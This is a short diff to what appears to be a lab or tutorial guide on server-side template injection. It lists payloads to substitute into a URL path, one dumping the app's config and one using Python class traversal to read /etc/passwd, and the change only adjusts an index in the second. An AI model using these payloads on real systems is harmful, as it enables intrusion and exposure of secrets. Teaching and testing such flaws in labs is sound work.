@@ -181,7 +181,7 @@ Now repeat the steps from the Firefox Browser and observe the results. Once the 
 * Substitute the `non_existent_path` with one of the payloads below.
 * Payloads: 
 	* `{{ config.items() }}`
-	* `{{''.__class__.mro()[1].__subclasses__()[40]('/etc/passwd').read()}}`
+	* `{{''.__class__.mro()[2].__subclasses__()[40]('/etc/passwd').read()}}`
 
 ### Vulnerable Code - Template Injection
 * Open Terminal
